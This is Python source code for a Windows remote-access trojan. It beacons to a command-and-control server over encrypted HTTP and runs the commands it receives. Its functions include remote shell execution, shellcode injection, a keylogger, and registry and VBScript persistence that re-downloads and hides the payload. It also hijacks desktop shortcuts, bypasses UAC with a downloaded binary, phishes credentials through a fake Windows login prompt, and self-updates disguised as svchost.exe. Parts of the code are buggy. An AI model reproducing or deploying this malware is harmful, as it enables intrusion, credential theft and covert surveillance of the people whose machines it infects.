import urllib2
import requests
import subprocess
import cStringIO
import base64
import time
import json
import os
import threading
import random
import ctypes
import pyHook
import pythoncom
import glob
import sys
import traceback
import socket
import win32com
from Crypto.Cipher import AES
from getpass import getuser
ID = '__ID__'
CIPHER = AES.new('__CIPHER__')
HOST = '__HOST__'
PORT = '__PORT__'
VERSION = '__VERSION__'
FILENAME = sys.argv[0]
admin = False
Procs = {}


class Proc(threading.Thread):
    def __init__(self, cmdid=None, args={}):
        if self:
            self.id = 'None'
            if not 'noThread' in args:
                self.id = cmdid
                threading.Thread.__init__(self)
            self.args = args
            self.output = cStringIO.StringIO()
            self.running = True
            self.start()
        
    def run(self):
        pass
        
    def read(self):
        op = self.output.getvalue()
            
        return op
        
    def end(self):
        del Procs[self.id]
        self.running = False
        self.output.seek(0)
        _post('cmd-stop', {'cmdid': self.id, 'output': self.output.getvalue(), 'prompt': getuser() + '@' + os.getcwd() + '>'})
        self.output.close()
        
        return True

				
def _post(action, d={}):
    d = (action, ID, d)
    
    try:
        d = json.dumps(d)
        d = _encodeAES(d, CIPHER)
    
        Conn = requests.post('http://' + HOST + ':' + PORT + '/cgi-bin/perfReport32.cgi', data={'data': d})
        message = Conn.text

        message = _decodeAES(message, CIPHER)
        message = json.loads(message)

    
    except:
        traceback.print_exc()
        message = {}

    finally:

        return message
        

def _encodeAES(secret, cipher):

    return base64.urlsafe_b64encode(cipher.encrypt(secret + (32-len(secret)%32)*'{')).encode('ascii')
    
    
def _decodeAES(secret, cipher):

    return cipher.decrypt(base64.urlsafe_b64decode(secret.encode('ascii'))).rstrip('{')


def _gen_str(l, h):
    length=random.randint(l, h)
    letters=string.ascii_letters+string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
    

def _cmd(args={}):
    args['noThread'] = True
    c = cmd(args)
    c.run()
    if c.output:
    
        return c.output.read()
    
    else:
    
        return False
        
        
def _update():
    try:
        binary = _post('update')
        file = open('svchost.exe', 'wb')
        file.write(binary)
        _cmd({'wait': False, 'cmd': 'start svchost.exe; timeout 10; del ' + sys.argv[0]})
        file.close()
        s = _shutdown

    except:

        return False
        
        
def _shutdown():
    for each in Procs:
        try:
            each[1].end()

        except:
            pass
            
    _post('bot-stop')
    sys.exit()
    
    return False
      
      
class persistence(Proc):
    def run(self):
        method = self.args['method']

        try:
            if (method == 'startup') and (admin):
                exedir = os.path.join(sys.path[0], sys.argv[0])
                exeown = exedir.split('\\')[-1]

                vbsdir = os.getcwd() + '\\' + 'vbscript.vbs'
                vbscript = 'state = 1\nhidden = 0\nwshname = "' + exedir + '"\nvbsname = "' + vbsdir + '"\nurlname = "' + redown + '"\ndirname = "' + newdir + '"\nWhile state = 1\nexist1 = ReportFileStatus(wshname)\nexist2 = ReportFileStatus(dirname)\nIf exist1 = False And exist2 = False then\ndownload urlname, dirname\nEnd If\nIf exist1 = True Or exist2 = True then\nif exist1 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(wshname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nexist2 = False\nend if\nif exist2 = True then\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(dirname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nend if\nset objFSO = CreateObject("Scripting.FileSystemObject")\nset objFile = objFSO.GetFile(vbsname)\nif objFile.Attributes AND 2 then\nelse\nobjFile.Attributes = objFile.Attributes + 2\nend if\nSet WshShell = WScript.CreateObject ("WScript.Shell")\nSet colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\nFor Each objProcess in colProcessList\nif objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\nvFound = True\nEnd if\nNext\nIf vFound = True then\nwscript.sleep 50000\nEnd If\nIf vFound = False then\nIf exist1 = True then\nWshShell.Run """' + exedir + '""",hidden\nEnd If\nIf exist2 = True then\nWshShell.Run """' + dirname + '""",hidden\nEnd If\nwscript.sleep 50000\nEnd If\nvFound = False\nEnd If\nWend\nFunction ReportFileStatus(filespec)\nDim fso, msg\nSet fso = CreateObject("Scripting.FileSystemObject")\nIf (fso.FileExists(filespec)) Then\nmsg = True\nElse\nmsg = False\nEnd If\nReportFileStatus = msg\nEnd Function\nfunction download(sFileURL, sLocation)\nSet objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\nobjXMLHTTP.open "GET", sFileURL, false\nobjXMLHTTP.send()\ndo until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\nIf objXMLHTTP.Status = 200 Then\nSet objADOStream = CreateObject("ADODB.Stream")\nobjADOStream.Open\nobjADOStream.Type = 1\nobjADOStream.Write objXMLHTTP.ResponseBody\nobjADOStream.Position = 0\nSet objFSO = Createobject("Scripting.FileSystemObject")\nIf objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\nSet objFSO = Nothing\nobjADOStream.SaveToFile sLocation\nobjADOStream.Close\nSet objADOStream = Nothing\nEnd if\nSet objXMLHTTP = Nothing\nEnd function\n'
                              
                vbs = open('vbscript.vbs', 'wb')
                vbs.write(vbscript)
                vbs.close()
                        
                _cmd({'cmd': 'reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v blah /t REG_SZ /d \"' + vbsdir + '\"'})
                
                self.output.write('True')
                
            elif method == 'shortcut':
                shell = win32com.client.dispatch('WScript.shell')
                desktop_path = shell.SHGetFolderPath(0, win32com.shell.shellcon.CSIDL_DESKTOP, 0, 0)
                shortcuts = glob.glob(desktop_path + '\\*.lnk')
                
                for cut in shortcuts:
                    cut.Arguments = cut.TargetPath
                    cut.TargetPath = FILENAME

                self.output.write('True')

            else:
                self.output.write('False')
                
        except:
            self.output.write('False')
            
        finally:
        
            self.end()
            return
    

class secureremove(Proc):
    def run(self):
        passes = self.args['passes']
        path = self.args['path']
        random.seed()
    
        try:
            with open(path, 'ba+') as delfile:
                length = delfile.tell()
                for each in xrange(passes):
                    delfile.seek(0)
                    for byte in xrange(length):
                        delfile.write(str(random.randrange(256)))
                        
            self.output.write(str(os.path.isfile(path)))

        except:
            self.output.write('False')
 
        finally:
    
            os.remove(path)
            self.end()
            return

            
class cmd(Proc):
    def run(self):
        c = self.args['cmd']
    
        try:
            #print 'args: ', self.args, ' command: ', c
            self.command = subprocess.Popen(c, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)

            while self.running and self.command.poll() is None:
                out = self.command.stdout.read(1)
                self.output.write(out)
            #print 'cstop'
    
        except:
            traceback.print_exc()
            self.output.write('False')

        finally:

            self.end()
            return
                
    def end(self, args={}):
        if self.command.poll() is None:
            self.command.kill()

        Proc.end(self)

        return True

class cd(Proc):
    def run(self):
        dir = self.args['directory']
        os.chdir(dir)
        
        self.end()
        return
        
class shellcodeinject(Proc):
    def run(self):
        shellcode = self.args['shellcode']
        if type(shellcode) == unicode:
            shellcode = shellcode.encode('latin-1').decode('string_escape')
        shellcode = bytearray(shellcode)

        try:
            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                                      ctypes.c_int(len(shellcode)),
                                                      ctypes.c_int(0x3000),
                                                      ctypes.c_int(0x40))
 
            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                                 buf,
                                                 ctypes.c_int(len(shellcode)))
 
            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(ptr),
                                                     ctypes.c_int(0),
                                                     ctypes.c_int(0),
                                                     ctypes.pointer(ctypes.c_int(0)))
 
            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))   

            self.output.write('True')
        
        except:
            traceback.print_exc()
            self.output.write('False')

        finally:

            self.end()
            return
            

class esculate(Proc):
    def __init__(self,args={}):
        Proc.__init__(args)
        self.winversion = _cmd({'cmd': 'systeminfo'})
        self.windowsnew = -1
        self.windowsold = -1
                
        self.windowsnew += winversion.find('Windows 7')
        self.windowsnew += winversion.find('Windows 8')
        self.windowsnew += winversion.find('Windows Vista')
        self.windowsnew += winversion.find('Windows VistaT')
        self.windowsnew += winversion.find('Windows Server 2008')
                
        self.windowsold += winversion.find('Windows XP')
        self.windowsold += winversion.find('Server 2003')
        
    def run(self):
        method = self.args['method']

        if (method == 'bypassUAS') and (_cmd({'cmd': 'net localgroup administrators | find "%USERNAME%"'}) != '') and (self.windowsnew > 0):
            try:
                binary = _post('binary-get', {'binary': 'bypassuac'})
                name = _gen_str(7, 12) + '.exe'
                file = open(name, 'wb')
                file.write(binary)
                file.close()

                d = os.getcwd() + '\\' + name
                curdir = os.path.join(sys.path[0], sys.argv[0])
                        
                if self.windowsnew > 0:
                    elvpri = _cmd({'cmd': d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto', 'quite': False})
                if self.windowsold > 0:
                    elvpri = _cmd({'cmd': 'sc create blah binPath= "' + curdir + '" type= own start= auto', 'quite': False})
        
                if self.windowsnew > 0:
                    elvpri = _cmd({'cmd': d + ' elevate /c sc start blah', 'quite': False})
                if self.windowsold > 0:
                    elvpri = _cmd({'cmd': 'sc start blah', 'quite': False})

            except:
                self.output.write('False')
                
            finally:

                self.exit()
                return
                                             
        if (method == 'weakFiles') and (not self.windowsold > 0):
            try:
                permatch = ['BUILTIN\Users:(I)(F)', 'BUILTIN\Users(F)']
                permbool = False
                
                search1 = _cmd({'cmd': 'for /f "tokens=2 delims=\'=\'\" %a in (\'wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"\') do @echo %a'})
                search2 = _cmd({'cmd': 'for /f eol^=^\"^ delims^=^\" %a in (\"' + search1 + '\") do cmd.exe /c icacls \"%a\"'})
                ap = 0
                bp = 0
                lines = search2.split('\n')
    
                for line in lines:
                    cp = 0
        
                    while cp < len(permatch):
                        j = line.find(permatch[cp])
               
                        if j != -1:
                            if permbool == False:
                                permbool = True
                            bp = ap

                            while True:
                                if len(lines[bp].split('\\')) > 2:
                                    while bp < ap:
                                        self.output.write(str(lines[bp]))
    
                                else:
                                    bp -= 1
                                    cp += 1
                                    ap += 1
                       
            except:
                self.output.write('False')

            finally:

                self.end()
                return

        if (method == 'phish') and (not self.windowsold > 0):
            try:
                cred = _cmd({'cmd': 'powershell.exe -ep bypass -c "function Invoke-LoginPrompt{; $description = \"Windows systems requires authentication\"; Add-Type -assemblyname System.DirectoryServices.AccountManagement; $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine); while($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){; $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"$description\", \"$env:userdomain\$env:username\",\"\"); if (-Not $cred){Exit}; $description = \"Invalid Credentials, Please try again\"; $username = \"$env:username\"; $domain = \"$env:userdomain\"; $full = \"$domain\" + \"\\\" + \"$username\"; $password = $cred.GetNetworkCredential().password; $DS.ValidateCredentials(\"$full\", \"$password\") | out-null; }; $output = $newcred = $cred.GetNetworkCredential(); $output; }; try{Invoke-LoginPrompt}catch{}"'})
                cred = cred.split('\n')[-1]
                domain = cred.split('    ')[0]
                user = cred.split('    ')[1]
                password = cred.split('    ')[2]
                
                self.output.write('domain: ' + domain + ', user: ' + user + ', password: ' + password)

            except:
                self.output.write('False')

            finally:
                self.end()
                return

class getip(Proc):
    def run(self):
        try:
            self.output.write(json.loads(urllib2.urlopen('http://httpbin.org/ip').read())['origin'].encode('ascii'))
        
        except:
            self.output.write('False')
             
        finally:
        
            self.end()
            return
            
class upload(Proc):
    def run(self):
        data = self.args['data']
        path = self.args['path']
        
        try:
            if 'append' in self.args:
                file = open(path, 'ab')
            
            else:
                file = open(path, 'wb')
            
            file.write(data)
            self.output.write('False')
            
            return
            
        except:
            self.output.write('False')
            
        finally:
            
            file.close()
            self.end()
            return
            

class readfile(Proc):
    def run(self):
        file = self.args['file']
        
        try:
            f = open(file, 'rb')
            
            self.output.write(f.read())
            
        except:
            self.output.write('False')
            
        finally:

            f.close()
            self.end()
            return
   
   
class keylogger(Proc):
    def run(self):
        self.hm = None
        
        def kl(event):
            if not self.running:
                self.hm.UnhookKeyboard()
                ctypes.windll.user32.PostQuitMessage(0)
                return
            
            else:
                if event:
		    if event.Ascii == 13:
			char = ' <ENTER> '
		    elif event.Ascii == 8:
			char = ' <BACK SPACE> '
		    elif event.Asci == 9:
			char = ' <TAB> '
		    else : 
			char = chr(event.Ascii)
			
                    self.output.write(char)
                
                    return True
            
                try:
                    self.hm = pyHook.HookManager()
                    self.hm.KeyDown = kl
                    self.hm.HookKeyboard()
                    pythoncom.PumpMessages()

                except:
                    self.output.write('ERROR')
                    self.end()

        kl(None)
        return
        
        
def main():
    a, b = .2, .2

    if len(sys.argv) > 1:
        _cmd({'cmd': 'start ' + sys.argv[1]})
    #time.sleep(300*random.uniform(0.85,1.15))
    _post('bot-start')
	
    while True:
        if b < 21600:
            a, b = b, a+b/3
        
        cmds = _post('cmd-get')
        print cmds, Procs
        if cmds:
            for c in cmds:
                if (c['function'] in Functions) or (c['function'] in ['read', 'end']):
                    try:
                        if c['function'] == 'read':
                            out = Procs[c['args']['cmdid']][1].read()
                            _post('cmd-stop', {'cmdid': c['cmdid'], 'output': out, 'prompt': getuser() + '@' + os.getcwd() + '>'})

                        elif c['function'] == 'end':
                            Procs[c['args']['cmdid']][1].end()
                            _post('cmd-stop', {'cmdid': c['cmdid'], 'output': None, 'prompt': getuser() + '@' + os.getcwd() + '>'})

                                
                        else:
                            thread = Functions[c['function']](c['cmdid'], c['args'])
                            Procs[c['cmdid']] = (c['function'], thread)
                            
                    except:
                        traceback.print_exc()
                            
                    finally:
                        a, b = 0.2, 0.2
                            
                elif c['function'] == 'update':
                    _update()
            
        else:
            time.sleep(b*random.uniform(0.7,1.0))
            
Functions = {'shellcodeinject': shellcodeinject,
             'persistence': persistence,
             'secureremove': secureremove,
             'cmd': cmd,
             'cd': cd,
             'keylogger': keylogger,
             'upload': upload,
             'readfile': readfile,
             'getip': getip,
             'esculate': esculate}
             
if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        pass
        
    except:
        traceback.print_exc()

    finally:
        _shutdown()
